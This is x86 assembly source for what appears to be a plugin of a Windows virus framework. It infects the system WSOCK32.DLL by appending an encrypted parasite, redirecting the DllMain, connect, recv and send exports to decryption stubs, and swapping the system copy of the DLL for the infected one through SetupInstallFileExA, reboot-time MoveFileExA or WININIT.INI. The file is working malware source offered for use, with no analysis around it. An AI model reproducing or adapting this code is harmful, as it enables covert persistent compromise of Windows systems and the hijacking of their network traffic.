BITS 32


%include "\muazzin\muazzin.asi"
%include "\muazzin\samples\pe.inc"


TYPE    EQU "pdll"
VERSION EQU 0100h


entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_QUERY
       jz .noquery
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       jmp .skip1
  .noquery:
       test dword [esi+m_why], MT_APP
       jz near .skip2
       pushad
       call dllinit
       jc near .error

       mov byte [ebp+.switch], 0e9h
       call [ebp+GetTickCount]
       mov [ebp+key_parasite], eax

       sub esp, 200h
       mov esi,esp
       push dword 200h
       push esi
       call [ebp+GetSystemDirectoryA]

       lea edi, [eax+esi]
       mov eax, "\WSO"
       stosd
       mov eax, "CK32"
       stosd
       mov eax, ".DLL"
       stosd
       sub eax, eax
       stosd

       push byte 0
       push byte READONLY
       push esi
       call map
       jc near .error

       mov eax, [ebp+handle3]
       mov ebx, eax
       add eax, [eax+3ch]
       lea esi, [eax+PE_HEADER_size+(IMAGE_DATA_DIRECTORY_size*15)]

       mov eax, [esi+SECTION_HEADER.VirtualAddress+SECTION_HEADER_size]
       sub eax, [esi+SECTION_HEADER.VirtualAddress]
       sub eax, [esi+SECTION_HEADER.VirtualSize]
       jc .nospace
       cmp eax, implant_size
  .nospace:
       jc near .close_error

       mov eax, [esi+SECTION_HEADER.VirtualAddress]
       add eax, [esi+SECTION_HEADER.VirtualSize]
       mov [ebp+_newRVA], eax

       mov eax, [esi+SECTION_HEADER.PointerToRawData]
       add eax, [esi+SECTION_HEADER.VirtualSize]
       mov [ebp+_newRAW], eax

       push dword [esi-(IMAGE_DATA_DIRECTORY_size*16)+IMAGE_DATA_DIRECTORY.VirtualAddress]
       call rva2raw

       mov eax, [eax+7*4]
       mov [ebp+_export], eax

       push eax
       call rva2raw

       mov ecx, [eax+15*4]         ;recv
       mov [ebp+_recv], ecx

       mov ecx, [eax+18*4]         ;send
       mov [ebp+_send], ecx

       mov ecx, [eax+3*4]          ;connect
       mov [ebp+_connect], ecx

       mov ecx, [esi-(IMAGE_DATA_DIRECTORY_size*15)-PE_HEADER_size+(PE_HEADER.AddressOfEntryPoint)]
       mov [ebp+_dllmain], ecx
       call .need_redirect
       jb .close_error666

       mov ecx, [ebp+_connect]
       call .need_redirect
       jb .close_error666

       mov ecx, [ebp+_recv]
       call .need_redirect
       jb .close_error666

       mov ecx, [ebp+_send]
       call .need_redirect
  .close_error666:
       jb near .close_error

       pushad
       push dword [ebp+_dllmain]
       call rva2raw
  .search_sign:
       cmp dword [eax+11h], "HYBR"
       jne .keepsearch
       cmp word [eax+11h+4], "IS"
       je .found_start
  .keepsearch:
       dec eax
       jmp .search_sign
  .found_start:
       mov edi, eax
       cmp word [eax], 016ebh
       jne .close_error

       mov ecx, [edi+2]            ;size
       shr ecx, 2
       mov [ebp+size_parasite_dd], ecx

       call [ebp+GetTickCount]
       and eax, 63
       add eax, 20h
       mov [ebp+verify_ofs], eax
       mov eax, [edi+eax]
       mov [ebp+verify_value], eax

       push esi
       sub edi, [ebp+handle3]
  .section_gay:
       mov eax, edi
       sub eax, [esi+SECTION_HEADER.PointerToRawData]
       jc .nao_e
       cmp eax, [esi+SECTION_HEADER.SizeOfRawData]
       jb .e_
  .nao_e:
       add esi, SECTION_HEADER_size
       jmp .section_gay
  .e_:
       add eax, [esi+SECTION_HEADER.VirtualAddress]
       mov [ebp+rva_virus], eax
       pop esi
       add eax, [esi-(IMAGE_DATA_DIRECTORY_size*15)-PE_HEADER_size+(PE_HEADER.ImageBase)]
       mov [ebp+start_parasite], eax

       popad
       mov byte [ebp+.switch], 0b8h
       jmp .close_error

  .close_error:
       call unmap
  .switch:
       jmp near .error

       sub esp, 200h
       mov ebx, esp
       push dword 200h
       push ebx
       call [ebp+GetSystemDirectoryA]

       lea edi, [ebx+eax]
       mov al, "\"
       stosb

       call [ebp+GetTickCount]
       and eax, 0f0f0f0fh
       add eax, "AAAA"
       stosd
       call [ebp+GetTickCount]
       xor eax,esp
       and eax, 0f0f0f0fh
       add eax, "AAAA"
       stosd
       sub eax, eax
       stosd

       lea esi, [ebp+filename]
       push byte 0
       push ebx
       push esi
       call [ebp+CopyFileA]
       test eax, eax
       jz near .realfuck

       push byte 0
       push byte READWRITE
       push ebx
       call map
       jc near .realfuck

       mov eax, [ebp+handle3]
       pushad
       mov ebx, eax
       add eax, [eax+3ch]
       lea esi, [eax+PE_HEADER_size+(IMAGE_DATA_DIRECTORY_size*15)]

       mov eax, implant_size
       add eax, [esi+SECTION_HEADER.VirtualSize]

       mov [esi+SECTION_HEADER.VirtualSize], eax
       cmp [esi+SECTION_HEADER.SizeOfRawData], eax
       jae .skipzz666
       mov [esi+SECTION_HEADER.SizeOfRawData], eax
  .skipzz666:
       mov edx, [ebp+_newRVA]
       mov eax, edx
       xchg [esi-(IMAGE_DATA_DIRECTORY_size*15)-PE_HEADER_size+(PE_HEADER.AddressOfEntryPoint)], eax
       sub eax, edx
       sub eax, new_connect-implant
       mov [ebp+old_DllMain], eax

       lea ecx, [edx+old_connect+4-implant]
       mov eax, [ebp+_connect]
       sub eax, ecx
       mov [ebp+old_connect], eax

       lea ecx, [edx+old_recv+4-implant]
       mov eax, [ebp+_recv]
       sub eax, ecx
       mov [ebp+old_recv], eax

       lea ecx, [edx+old_send+4-implant]
       mov eax, [ebp+_send]
       sub eax, ecx
       mov [ebp+old_send], eax

       push esi
       mov ecx, implant_size
       lea esi, [ebp+implant]
       mov edi, [ebp+_newRAW]
       add edi, ebx
       rep movsb
       pop esi

       push dword [ebp+_export]
       call rva2raw
       add edx, new_connect-implant
       mov [eax+3*4], edx
       add edx, new_recv-new_connect
       mov [eax+15*4], edx    ;recv
       add edx, new_send-new_recv
       mov [eax+18*4], edx    ;send

       push dword [ebp+rva_virus]
       call rva2raw
       mov esi, eax
       mov eax, [ebp+size_parasite_dd]
       call desencripta

       popad
       call unmap

       mov esi, esp
       lea edi, [esp+200h]

       call .zkipnamez
       db "SETUPAPI.DLL",0
  .zkipnamez:
       call [ebp+LoadLibraryA]
       mov ebx, eax
       test eax, eax
       jz .apidontexists

       push ebx

       call .zkipnamez2
       db "SetupInstallFileExA",0
  .zkipnamez2:
       push ebx
       call [ebp+getpaddr]
       sub ebx, ebx
       test eax, eax
       jz .apidontexists2

       push ebx
       push esp
       push ebx
       push ebx
       push dword 441h                 ;sp_copy_source_absolute+sp_copy_deletesource
       push edi                  ;+sp_copy_noskip
       push ebx
       push esi
       push ebx
       push ebx
       call eax
       mov ebx, eax
       pop eax
  .apidontexists2:
       call [ebp+FreeLibrary]
  .apidontexists:
       test ebx, ebx
       jnz .realfuck

       push byte 4+1                 ;MOVEFILE_DELAY_UNTIL_REBOOT
                                ;+MOVEFILE_REPLACE_EXISTING
       push edi
       push esi
       call [ebp+MoveFileExA]
       test eax, eax
       jnz .realfuck

       push dword "me"
       push dword "Rena"
       mov ebx, esp

       push dword "NUL"
       mov ecx, esp

       push dword "INI"
       push dword "NIT."
       push dword "WINI"

       push esp
       push edi
       push ecx
       push ebx
       call [ebp+WritePrivateProfileStringA]

       push esp
       push esi
       push edi
       push ebx
       call [ebp+WritePrivateProfileStringA]

       add esp, byte 6*4

  .realfuck:
       add esp, 200h
  .error:
       add esp, 200h
       call dlldone
       popad
  .skip2:
       mov dword [esi+m_result], MR_DONE
  .skip1:
       ret 4

  .need_redirect:
       sub ecx, [esi+SECTION_HEADER.VirtualAddress]
       cmp ecx, [esi+SECTION_HEADER.SizeOfRawData]
       ret

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

rva2raw:
       pushad
       mov ebx, [esp+8*4+4]
  .section:
       mov eax, ebx
       sub eax, [esi+SECTION_HEADER.VirtualAddress]
       cmp eax, [esi+SECTION_HEADER.VirtualSize]
       jbe .found
       add esi, SECTION_HEADER_size
       jmp .section
  .found:
       add eax, [esi+SECTION_HEADER.PointerToRawData]
       add eax, [ebp+handle3]
       mov [esp+7*4], eax
       popad
       ret 4

dllinit:
       call delta
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       test eax, eax
       jz .error
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax
       mov ecx, [esp]
       mov [ecx-4], eax
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       mov [esi-4], eax
       test eax, eax
       jz .error
       jmp .next_import
  .dll_done:
       pop esi
       jmp .next_dll
  .error:
       pop esi
       stc
       db 0b0h
  .all_import:
       clc
       ret

dlldone:
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp .next_unload
  .all_unload:
       ret

implant:
       call decrypt
       db 0e9h
 old_DllMain equ $
       dd 0

new_connect:
       call decrypt
       db 0e9h
 old_connect equ $
       dd 0

new_recv:
       call decrypt
       db 0e9h
 old_recv equ $
       dd 0

new_send:
       call decrypt
       db 0e9h
 old_send equ $
       dd 0

decrypt:
       pushad
       mov esi, 12345678h
 start_parasite equ $-4
       mov eax, 200h
 size_parasite_dd equ $-4
 verify_ofs equ $+2
       cmp dword [esi+12345678h], 12345678h
 verify_value equ $-4
       je .already
  .loop:
       xor dword [esi+eax*4], 12345678h
 key_parasite equ $-4
       dec eax
       jns .loop
  .already:
       popad
       ret

implant_size equ $-implant

desencripta:
       pushad
       jmp decrypt.loop

getpaddr dd 0
getmhnd  dd 0

import_table dd kernel32
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
.api012     dd .apiname012
.api014     dd .apiname014
.api015     dd .apiname015
.api016     dd .apiname016
.api017     dd .apiname017
.api018     dd .apiname018
.api019     dd .apiname019
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname007 db "GetTickCount", 0
.apiname008 db "CreateFileMappingA", 0
.apiname009 db "MapViewOfFile", 0
.apiname010 db "UnmapViewOfFile", 0
.apiname011 db "GetSystemDirectoryA", 0
.apiname012 db "MoveFileExA", 0
.apiname014 db "FindFirstFileA", 0
.apiname015 db "FindClose", 0
.apiname016 db "SetFileAttributesA", 0
.apiname017 db "SetFileTime", 0
.apiname018 db "CopyFileA", 0
.apiname019 db "WritePrivateProfileStringA",0


LoadLibraryA       equ kernel32.api001
FreeLibrary        equ kernel32.api002
CreateFileA        equ kernel32.api003
CloseHandle        equ kernel32.api004
GetTickCount       equ kernel32.api007
CreateFileMappingA equ kernel32.api008
MapViewOfFile      equ kernel32.api009
UnmapViewOfFile    equ kernel32.api010
GetSystemDirectoryA equ kernel32.api011
MoveFileExA        equ kernel32.api012
FindFirstFileA     equ kernel32.api014
FindClose          equ kernel32.api015
SetFileAttributesA equ kernel32.api016
SetFileTime        equ kernel32.api017
CopyFileA          equ kernel32.api018
WritePrivateProfileStringA equ kernel32.api019

%include "\muazzin\samples\maplib.asi"

rva_virus dd 0

_newRAW dd 0
_newRVA dd 0
_export dd 0
_connect dd 0
_send dd 0
_recv dd 0
_dllmain dd 0

